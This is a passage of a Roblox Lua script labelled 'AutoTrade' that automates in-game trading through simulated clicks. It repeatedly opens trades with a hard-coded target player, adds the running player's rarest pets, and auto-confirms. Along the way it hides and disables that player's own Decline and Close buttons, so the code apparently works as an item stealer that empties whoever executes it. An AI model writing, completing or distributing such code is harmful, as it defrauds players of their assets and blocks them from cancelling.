local function fastClick(button)
    if not button then return end
    local inset = GuiService:GetGuiInset()
    local posX = button.AbsolutePosition.X + (button.AbsoluteSize.X / 2)
    local posY = button.AbsolutePosition.Y + (button.AbsoluteSize.Y / 2) + inset.Y
    VirtualInputManager:SendMouseButtonEvent(posX, posY, 0, true, game, 1)
    task.wait(CLICK_HOLD)
    VirtualInputManager:SendMouseButtonEvent(posX, posY, 0, false, game, 1)
end

local function hideTradeButtons(TradeFrame)
    if not HIDE_DECLINE_CLOSE or not TradeFrame then return end
    for _, btnName in ipairs({"Decline", "Close"}) do
        local btn = TradeFrame:FindFirstChild(btnName, true)
        if btn then
            pcall(function()
                btn.Visible = false; btn.Active = false; btn.Selectable = false
                if btn:IsA("GuiButton") then btn.Interactable = false end
            end)
        end
    end
end

local function restoreTradeButtons(TradeFrame)
    if not TradeFrame then return end
    for _, btnName in ipairs({"Decline", "Close"}) do
        local btn = TradeFrame:FindFirstChild(btnName, true)
        if btn then
            pcall(function()
                btn.Visible = true; btn.Active = true; btn.Selectable = true
                if btn:IsA("GuiButton") then btn.Interactable = true end
            end)
        end
    end
end

local function forceCloseTradePlayer()
    local TradePlayerGui = PlayerGui:FindFirstChild("TradePlayer")
    if not TradePlayerGui then return end
    local closeBtn = TradePlayerGui.Container.General:FindFirstChild("Close", true)
    if closeBtn then pcall(function() fastClick(closeBtn) end); task.wait(0.15) end
    if TradePlayerGui.Enabled then pcall(function() TradePlayerGui.Enabled = false end) end
end

local function doOneTrade()
    print("[AutoTrade] Cycle vers " .. TARGET_PLAYER_NAME)
    setStatus("🔍 Recherche de " .. TARGET_PLAYER_NAME .. "...")
    
    local Mainscreen = PlayerGui:WaitForChild("Mainscreen")
    local TradePlayerGui = PlayerGui:WaitForChild("TradePlayer")
    local TradingGui = PlayerGui:FindFirstChild("Trading")
    
    if TradingGui and TradingGui.Enabled then
        restoreTradeButtons(TradingGui.Container.Frame)
        task.wait(0.1)
        local closeTrade = TradingGui.Container.Frame:FindFirstChild("Close", true)
        if closeTrade then fastClick(closeTrade); task.wait(0.5) end
    end

    if not TradePlayerGui.Enabled then
        local blueButton = Mainscreen.Right:FindFirstChild("TradePlayer")
        if blueButton then fastClick(blueButton); task.wait(0.8) end
    end

    local scrollingFrame = TradePlayerGui.Container.General.Frame.Frame.ScrollingFrame
    local targetGreenButton = nil
    for _, obj in ipairs(scrollingFrame:GetDescendants()) do
        if obj:IsA("TextLabel") and string.find(string.lower(obj.Text), string.lower(TARGET_PLAYER_NAME)) then
            local parent = obj.Parent
            while parent and parent ~= scrollingFrame do
                local btn = parent:FindFirstChild("Trade", true)
                if btn and btn:IsA("TextButton") then targetGreenButton = btn; break end
                parent = parent.Parent
            end
            if targetGreenButton then break end
        end
    end

    if not targetGreenButton then
        warn("[AutoTrade] " .. TARGET_PLAYER_NAME .. " introuvable. Attente 10s...")
        setStatus("❌ Cible introuvable (10s)")
        forceCloseTradePlayer()
        task.wait(10)
        return false
    end

    print("[AutoTrade] Demande envoyée")
    setStatus("📩 Demande envoyée")
    fastClick(targetGreenButton)
    task.wait(0.15)
    forceCloseTradePlayer()

    local waitTime = 0
    local tradeOuvert = false
    while waitTime < 60 do
        task.wait(0.5); waitTime = waitTime + 0.5
        local tg = PlayerGui:FindFirstChild("Trading")
        if tg and tg.Enabled then tradeOuvert = true; TradingGui = tg; break end
    end

    if not tradeOuvert then
        warn("[AutoTrade] Pas d'acceptation.")
        setStatus("❌ Pas d'acceptation")
        return false
    end

    print("[AutoTrade] Trade ouvert - Ajout des pets")
    setStatus("🎉 Ajout des pets...")
    task.wait(1)

    local TradeFrame = TradingGui.Container.Frame
    hideTradeButtons(TradeFrame)

    local CurInventory = TradeFrame.CurInventory.ScrollingFrame
    local CurOffer = TradeFrame.CurOffer
    local SearchBar = TradeFrame.CurInventory.Search:FindFirstChildOfClass("TextBox")

    local function typeSearch(text)
        SearchBar:CaptureFocus(); SearchBar.Text = text; SearchBar:ReleaseFocus()
    end

    local petsAdded = 0
    local petsToAdd = MAX_PETS
    for _, child in ipairs(CurOffer:GetChildren()) do
        if child:IsA("TextButton") or child.Name:find("_") then petsToAdd = petsToAdd - 1 end
    end

    if petsToAdd > 0 then
        for _, petName in ipairs(SEARCH_ORDER) do
            if petsAdded >= petsToAdd then break end
            typeSearch(petName); task.wait(DELAY_SEARCH)
            local foundAny = true
            while foundAny and petsAdded < petsToAdd do
                foundAny = false
                for _, item in ipairs(CurInventory:GetChildren()) do
                    if petsAdded >= petsToAdd then break end
                    if string.find(string.lower(item.Name), string.lower(petName)) then
                        if not CurOffer:FindFirstChild(item.Name) then
                            local btn = item:IsA("TextButton") and item or item:FindFirstChild("Frame")
                            if btn then
                                foundAny = true
                                fastClick(btn)
                                local waitTimer = 0
                                while not CurOffer:FindFirstChild(item.Name) and waitTimer < 20 do
                                    task.wait(0.01); waitTimer = waitTimer + 1
                                end
                                petsAdded = petsAdded + 1
                                break
                            end
                        end
                    end
                end
            end
        end
        typeSearch("")
    end

    if petsAdded == 0 then
        warn("[AutoTrade] Plus de pets rares.")
        setStatus("🛑 Plus de pets rares")
        return false
    end

    print("[AutoTrade] Ready (" .. petsAdded .. " pets)")
    setStatus("⏳ Ready (" .. petsAdded .. " pets)")
    local readyBtn = TradeFrame:FindFirstChild("Ready")
    if readyBtn then
        fastClick(readyBtn)
        local timer = 0
        while timer < 30 do
            task.wait(0.05); timer = timer + 0.05
            local acceptBtn = TradeFrame:FindFirstChild("Confirm") or TradeFrame:FindFirstChild("Accept")
            if readyBtn and readyBtn.Text == "Accept" then acceptBtn = readyBtn end
            if acceptBtn then
                print("[AutoTrade] Accept - Terminé")
                setStatus("✅ Trade terminé")
                task.wait(0.05)
                fastClick(acceptBtn)
                return true
            end
        end
    end
    return false
end

-- ============================================================
-- 🔄 BOUCLE AUTO TRADE
-- ============================================================
local isAutoTrading = false
local tradeLoopRunning = false

local function startTradeLoop()
    if tradeLoopRunning then return end
    tradeLoopRunning = true
    task.spawn(function()
        while isAutoTrading do
            doOneTrade()
            if isAutoTrading then
                print("[AutoTrade] Cooldown " .. TEMPS_ENTRE_2_TRADES .. "s...")
                for i = TEMPS_ENTRE_2_TRADES, 1, -1 do
                    if not isAutoTrading then break end
                    setStatus("⏳ Cooldown " .. i .. "s...")
                    task.wait(1)
                end
            end
        end
        tradeLoopRunning = false
    end)
end

